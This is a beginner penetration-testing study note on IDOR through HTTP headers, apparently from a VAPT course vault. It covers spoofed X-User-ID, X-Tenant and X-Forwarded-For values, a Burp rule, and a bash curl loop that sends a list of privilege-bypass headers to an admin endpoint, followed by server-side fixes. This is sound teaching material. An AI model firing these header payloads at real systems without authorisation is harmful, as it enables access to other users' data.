---
tags: [vapt, access-control, idor, beginner]
difficulty: beginner
module: "21 - Access Control"
topic: "21.07 IDOR in HTTP Headers"
---

# 21.07 — IDOR in HTTP Headers

## Header-Based Object References

```
SOME APPS USE HTTP HEADERS TO IDENTIFY USER OR CONTEXT:
  X-User-ID: 42
  X-Account: ACC-001
  X-Tenant: company-a
  X-Forwarded-For: (sometimes misused for auth!)
  X-Original-User: john@example.com
  
  COMMONLY SET BY:
  - API Gateways (pass user context downstream)
  - Load balancers (add client identification)
  - Proxies (add forwarding info)
  - App itself (for internal service calls)
  
  PROBLEM:
  If server trusts client-supplied headers for identity → IDOR!
  Client can set any header they want!
```

---

## API Gateway Header Bypass

```
ARCHITECTURE:
  Client → API Gateway → Backend Service
  
  API Gateway: authenticates user, adds headers:
  X-User-ID: 42
  X-Role: user
  X-Account: ACC-001
  
  Backend: trusts these headers (comes from trusted gateway)
  
  VULNERABILITY:
  If backend is accessible DIRECTLY (not just via gateway):
  → Client calls backend directly → sets own headers!
  → X-User-ID: 1 → access admin's data!
  
  OR: Gateway passes client-supplied headers through
  → API adds X-User-ID if not present
  → But: if client already set it → gateway uses client's value!
  
  TESTING:
  Add headers to any request:
  X-User-ID: 1
  X-Account: ADMIN-001
  X-Role: admin
  → Does server trust them?
```

---

## Common Header IDOR Patterns

```
X-USER-ID HEADER:
  GET /api/profile HTTP/1.1
  Host: api.example.com
  X-User-ID: 42
  
  Modify to:
  X-User-ID: 1
  → Admin profile?

X-TENANT / X-ORGANIZATION:
  GET /api/data HTTP/1.1
  X-Tenant: my-company
  
  Modify to:
  X-Tenant: other-company
  → Other org's data?

AUTHORIZATION HEADER MISUSE:
  Bearer tokens encode claims (JWT)
  If claims not validated → modify JWT → see IDOR via JWT!
  (Covered in JWT module, but relevant here too)

X-FORWARDED-FOR MISUSE FOR AUTH:
  Some apps use X-Forwarded-For as IP-based access control:
  "Allow from 10.0.0.0/8 (internal network) only"
  
  X-Forwarded-For: 10.0.0.1
  → Server thinks request from internal network → bypasses IP check!
  
  (Also: 127.0.0.1, ::1, localhost)
```

---

## Testing Header IDOR

```bash
# ADD SUSPICIOUS HEADERS TO EVERY REQUEST:
# In Burp: Proxy → Options → Match and Replace:
# Add rule: "Request Header" → blank, "Replacement" → "X-User-ID: 1"
# → Automatically tests X-User-ID: 1 on every request!

# MANUAL TESTING:
# In Burp Repeater, add headers:
GET /api/admin/users HTTP/1.1
Host: api.example.com
Cookie: session=YOUR_SESSION
X-User-ID: 1
X-Role: admin
X-Forwarded-For: 127.0.0.1

# COMMON HEADERS TO TEST:
HEADERS_TO_TRY=(
  "X-User-ID: 1"
  "X-UserId: 1"
  "X-Account: ADMIN"
  "X-Role: admin"
  "X-Admin: true"
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "X-Tenant: admin-tenant"
  "X-Org-ID: 1"
  "X-Authorization: admin"
)

for header in "${HEADERS_TO_TRY[@]}"; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "$header" \
    -b "session=YOUR_SESSION" \
    https://api.example.com/admin)
  echo "$header -> $response"
done

# LOOK FOR:
# 200 vs 403 → header changed access!
# Different response body with different header value
```

---

## Internal Service Header Abuse

```
MICROSERVICES PATTERN:
  Service A calls Service B with:
  POST http://service-b/internal/api
  X-Internal-Service: service-a
  X-User-ID: 42
  
  Service B trusts X-Internal-Service header
  (Assumes only internal services can add it)
  
  ATTACK:
  External request to Service B (if exposed):
  X-Internal-Service: service-a
  X-User-ID: 1
  → Service B thinks it's internal call from Service A → trusts!
  → Accesses user 1's data!
  
  FINDING:
  Look for internal-only endpoints exposed externally
  Look for /internal/, /private/, /api/v1/internal/ paths
  Check API documentation for service-to-service APIs
```

---

## Fix

```
SECURE HEADER HANDLING:

NEVER TRUST USER-SUPPLIED IDENTITY HEADERS:
  ✗ user_id = request.headers.get('X-User-ID')
  ✓ user_id = get_user_id_from_session(request.cookies.get('session'))

INTERNAL SERVICE CALLS — USE NETWORK CONTROLS:
  Backend services should ONLY be accessible from internal network:
  → Firewall rules: only allow API gateway IP to reach backend
  → Service mesh with mTLS (only authenticated services can call each other)
  
  IF YOU MUST USE HEADERS FOR SERVICE IDENTITY:
  → Sign the headers with a secret known only to trusted services
  → HMAC: X-Internal-Auth: HMAC-SHA256(secret, timestamp+service_name)
  → Verify signature on each internal request

NGINX — STRIP CLIENT HEADERS AT GATEWAY:
  # In Nginx (API gateway layer):
  # Remove any X-User-ID header that client tries to send:
  proxy_set_header X-User-ID "";  # Clear it first
  # Then set it from authenticated session:
  proxy_set_header X-User-ID $authenticated_user_id;  # From Nginx auth module

HEADER INJECTION FOR ADMIN BYPASS:
  # Headers like X-Forwarded-For used for IP allowlisting:
  # NEVER allow X-Forwarded-For to override real IP for access control
  # Use REMOTE_ADDR (actual TCP connection IP) instead
  # Nginx sets: $remote_addr → actual IP, not spoofable
```

---

## Related Notes
- [[03 - IDOR — Insecure Direct Object Reference]] — IDOR overview
- [[06 - IDOR in Cookies]] — cookie-based IDOR
- [[11 - Forced Browsing / Unprotected Admin Endpoints]] — admin access bypasses
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
